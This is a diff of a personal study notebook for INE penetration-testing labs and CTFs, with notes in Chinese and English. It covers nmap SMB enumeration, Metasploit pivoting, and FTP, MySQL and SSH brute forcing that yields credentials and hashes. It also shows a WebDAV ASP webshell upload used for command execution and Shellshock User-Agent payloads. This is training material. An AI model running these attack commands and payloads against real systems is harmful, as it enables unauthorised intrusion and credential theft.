@@ -5,10 +5,10 @@
 	Discover all alive ports : nmap -Pn demo.ine.local
 
 	nmap -Pn -sV demo.ine.local
-	-p 443 (https)
+		-p 443 (https)
 	
  	Scan the Server 1: 
-  	nmap demo.ine.local -p- -sV
+  		nmap demo.ine.local -p- -sV
 ## Assessment Methodologies: Footprinting and Scanning CTF 1
 	nmap -Pn -sV -sC -p- target.ine.local
 
@@ -18,20 +18,20 @@
 	SHOW DATABASES;
 
 ## Windows Recon: SMB Nmap Scripts
-
-		nmap -p445 --script smb-protocols demo.ine.local (Protocol)
-		nmap -p445 --script smb-security-mode demo.ine.local ( security level )
-		
+	nmap -p445 --script smb-protocols demo.ine.local (Protocol)
+	nmap -p445 --script smb-security-mode demo.ine.local ( security level )
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
 	枚舉透過 SMB 共用登入系統的使用者 ( sessions)
 		nmap -p445 --script smb-enum-sessions demo.ine.local
 		nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local (Active SMB sessions)
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	枚舉所有可用的共享 (shares)
 		nmap -p445 --script smb-enum-shares demo.ine.local
 		10.0.30.254\IPC$ (空會話連線)
 	Windows 允許匿名使用者執行某些活動，例如枚舉網域帳戶和網路共用的名稱
 		nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
-	管理員使用者對整個C$擁有讀寫權限。即C:\
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 	管理員使用者對整個C$擁有讀寫權限。即C:\
 		|   \\10.0.31.14\ADMIN$: 
 		|     Type: STYPE_DISKTREE_HIDDEN
 		|     Comment: Remote Admin
@@ -40,29 +40,31 @@
 		|     Path: C:\Windows
 		|     Anonymous access: <none>
 		|     Current user access: READ/WRITE
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	列舉目標電腦上的 Windows 使用者。(Windows users)
 		nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	取得有關伺服器統計資料。它使用連接埠 445 和連接埠 139 來獲取詳細資訊
 		nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
 
 		|_    34 failed logins, 7 permission errors, 0 system errors, 0 print jobs, 37 files opened
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	枚舉目標電腦上的可用網域 (domains)
 		nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
-	枚舉目標電腦上的可用使用者群組
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 	枚舉目標電腦上的可用使用者群組
 		nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	枚舉目標機器上的服務 (services)
 		nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
-	列舉所有共用資料夾和驅動器，然後在所有共用資料夾上執行ls指令 (show all file)
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 	列舉所有共用資料夾和驅動器，然後在所有共用資料夾上執行ls指令 (show all file)
 		nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
 
 ## Importing Nmap Scan Results Into MSF (have address)
 	=> 將 Nmap 掃描結果匯入 MSF
 		nmap -sV -Pn -oX myscan.xml demo.ine.local
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	service postgresql start
 	msfconsole
 		msf6 > db_status  
@@ -78,34 +80,32 @@
 		set TARGETURI /
 		set LHOST 192.41.123.2 
 		run
-	
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	shell => ip addr
 	eth1 介面上的 IP 位址是 192.143.222.2，第二個目標機器將位於第二個網路上的 192.143.222.3
-	
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	meterpreter > run autoroute -s 192.143.222.2
-	meterpreter > background
-	
-	TO create nmap :
+	meterpreter>  background
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	To create nmap :
 		use auxiliary/scanner/portscan/tcp
 		set RHOSTS  192.143.222.3
 		set verbose false
 		set ports 1-1000
 		exploit
-	
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ls -al /root/static-binaries/nmap
 	file /root/static-binaries/nmap
-	
-	
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nano bash-port-scanner.sh
 	#!/bin/bash
 	for port in {1..1000}; do
 	 timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
 	done
-	
-	
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	sessions -i 1
-	upload /root/static-binaries/nmap /tmp/nmap
-	upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
+		upload /root/static-binaries/nmap /tmp/nmap
+		upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
 	
 	shell
 	python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -115,20 +115,19 @@
 	./nmap -p- 192.143.222.3
 
 ## FTP Enumeration
-
 	msfconsole
 	識別目標上運行的 FTP 伺服器的服務版本 :
 		use auxiliary/scanner/ftp/ftp_version
 		set RHOSTS demo.ine.local
 		run
-	
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	暴力破解來識別可用於身份驗證的合法憑證：
 		use auxiliary/scanner/ftp/ftp_login
 		set RHOSTS demo.ine.local
 		set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
 		set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 		run
-	
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	檢查 FTP 伺服器是否允許匿名登錄：
 		use auxiliary/scanner/ftp/anonymous
 		set RHOSTS demo.ine.local
@@ -139,41 +138,37 @@
 	[+] 192.87.133.3:21       - 192.87.133.3:21 - Login Successful: rooty:qwerty
 
 ## Samba Recon: Basics
-
 	Find the default tcp ports used by smbd:
 	=> nmap demo.ine.local
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Find the default udp ports used by nmbd:
 	=> nmap -sU --top-ports 25 demo.ine.local
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	What is the workgroup name of samba server?
 	=> nmap -sV -p 445 demo.ine.local
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Find the exact version of samba server by using appropriate nmap script
 	What is the NetBIOS computer name of samba server?
 	=> nmap --script smb-os-discovery.nse -p 445 demo.ine.local
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Find the exact version of samba server by using smb_version metasploit module
 	=> msfconsole -q
 	use auxiliary/scanner/smb/smb_version
 	set RHOSTS demo.ine.local
 	exploit
-
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Find the NetBIOS computer name of samba server using nmblookup
 	=> nmblookup -A demo.ine.local
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Using smbclient determine whether anonymous connection (null session) is allowed on the samba server or not
 	（空會話） | IPC$
 	=> smbclient -L demo.ine.local -N
-
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Using rpcclient determine whether anonymous connection (null session) is allowed on the samba server or not.
 	=> rpcclient -U "" -N demo.ine.loca
 		rpcclient $> l
 	允許匿名連接 : 在沒有任何憑證的情況下連接到 samba 伺服器時不會引發錯誤
 ## Apache Enumeration
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ping -c 5 victim-1
 	
 	msfconsole -q
@@ -269,7 +264,6 @@
 	set RHOSTS demo.ine.local
 	run
 	[+] 192.211.100.3:3306 - 192.211.100.3:3306 is running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
-
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use auxiliary/scanner/mysql/mysql_login
 	set RHOSTS demo.ine.local
@@ -278,7 +272,6 @@
 	set VERBOSE false
 	run
 	[+] 192.211.100.3:3306    - 192.211.100.3:3306 - Success: 'root:twinkle'   
-
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use auxiliary/admin/mysql/mysql_enum
 	set USERNAME root
@@ -288,7 +281,6 @@
 
 	List of Accounts with Password Hashes:
 	[+] 192.211.100.3:3306 -      User: root Host: localhost Password Hash: *A0E23B565BACCE3E70D223915ABF2554B2540144
-
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use auxiliary/admin/mysql/mysql_sql
 	set USERNAME root
@@ -321,8 +313,6 @@
 
 	[+] 192.211.100.3:3306 - Saving HashString as Loot: root:*A0E23B565BACCE3E70D223915ABF2554B2540144
 	[+] 192.211.100.3:3306 - Saving HashString as Loot: debian-sys-maint:*F4E71A0BE028B3688230B992EEAC70BC598FA723
-
-
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use auxiliary/scanner/mysql/mysql_schemadump
 	set USERNAME root
@@ -376,8 +366,6 @@
 	exploit
 
 	[+] 192.220.149.3:22 - Success: 'sysadmin:hailey' 'uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin) Linux demo.ine.local 6.8.0-39-generic #39-Ubuntu SMP PREEMPT_DYNAMIC Fri Jul  5 21:49:14 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux '
-
-
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	sessions
 	=> 1         shell linux  SSH root @   192.220.149.2:37181 -> 192.220.149.3:22 (192.220.149.3)
@@ -472,7 +460,6 @@
 
 ## Assessment Methodologies: Enumeration CTF 1
 
-
 	提供有關可用共享及其存取權限的資訊 :
 	enum4linux -a target.ine.local
 
@@ -491,13 +478,13 @@
 	# Define the target and wordlist location
 	TARGET="target.ine.local"
 	WORDLIST="/root/Desktop/wordlists/shares.txt"
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	# Check if the wordlist file exists
 	if [ ! -f "$WORDLIST" ]; then
 	    echo "Wordlist not found: $WORDLIST"
 	    exit 1
 	fi
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	# Loop through each share in the wordlist
 	while read -r SHARE; do
 	    echo "Testing share: $SHARE"
@@ -545,9 +532,9 @@
 	Davtest 是一個 WebDAV 掃描器 將漏洞利用檔案傳送到 WebDAV 伺服器並自動建立目錄
 	Cadaver 是一個用於 WebDAV 用戶端的工具，它支援命令列風格的介面。支援文件上傳、編輯、移動等操作
 	| Username | Password | | bob | password_123321 |
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap demo.ine.local
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	將重點放在運行 IIS 伺服器的連接埠 80 :
 	nmap --script http-enum -sV -p 80 demo.ine.local
 	| http-enum: 
@@ -555,23 +542,21 @@
 
 	davtest -url http://demo.ine.local/webdav
 	OPEN            FAIL:   http://demo.ine.local/webdav    Unauthorized. Basic realm="demo.ine.local"
-
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
 	EXEC    asp     SUCCEED: 
 	EXEC    html    SUCCEED:  
 	EXEC    txt     SUCCEED: 
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	使用cadaver公用程式將目標電腦上的.asp後門上傳到/webdav目錄
 	cadaver http://demo.ine.local/webdav
 	put /usr/share/webshells/asp/webshell.asp
 	ls
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	URL: http://demo.ine.local/webdav/webshell.asp
 	=> Command injestion
 	http://demo.ine.local/webdav/webshell.asp?cmd=dir+C%3A%5C
 	http://demo.ine.local/webdav/webshel​​l.asp?cmd=type+C%3A%5Cflag.txt
-
 
 ## Shellshock
 	=> OWASP A9 Using Components with Known Vulnerabilities
@@ -589,7 +574,7 @@
 	User-Agent :　() { :; }; echo; echo; /bin/bash -c 'id'
 	User-Agent :　() { :; }; echo; echo; /bin/bash -c 'ps -ef'
 ## Web App Vulnerability Scanning With WMAP
-識別 Web 伺服器上的錯誤配置和可利用的漏洞
+	識別 Web 伺服器上的錯誤配置和可利用的漏洞
 
 	識別目標IP位址 => ifconfig (192.234.27.2)
 	要載入 WMAP 擴展 => msfconsole msf5 >  load wmap
